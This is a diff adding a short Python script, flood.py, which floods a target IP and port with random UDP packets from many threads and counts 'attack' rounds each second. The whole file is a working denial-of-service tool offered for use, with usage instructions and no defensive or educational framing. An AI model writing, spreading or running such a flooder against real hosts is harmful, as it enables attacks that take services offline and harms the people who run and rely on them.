@@ -1,0 +1,39 @@
+#!/usr/bin/python
+import socket, sys, random, time, threading
+
+if len(sys.argv) == 5:
+    # Get IP, Port, length of attavk, and threads
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    length = int(sys.argv[3])
+    threads = int(sys.argv[4])
+else:
+    print("Usage: python3 flood.py ip port length threads")
+    exit(1)
+
+# Create a socket for the server
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
+print("Press Ctrl+C to exit the program")
+
+# Generate random data to use in the attack
+data = random._urandom(length)
+
+# Function to perform the flood attack
+def flood():
+    while True:
+        # Connect to the server and send the data
+        s.connect((ip, port))
+        s.sendto(data, (ip, port))
+
+# Create the specified number of threads
+for i in range(threads):
+    thread = threading.Thread(target=flood)
+    thread.start()
+
+# Keep track of the number of attacks
+attack_num = 0
+
+while True:
+    attack_num += 1
+    print(f"Attack number: {attack_num}")
+    time.sleep(1)
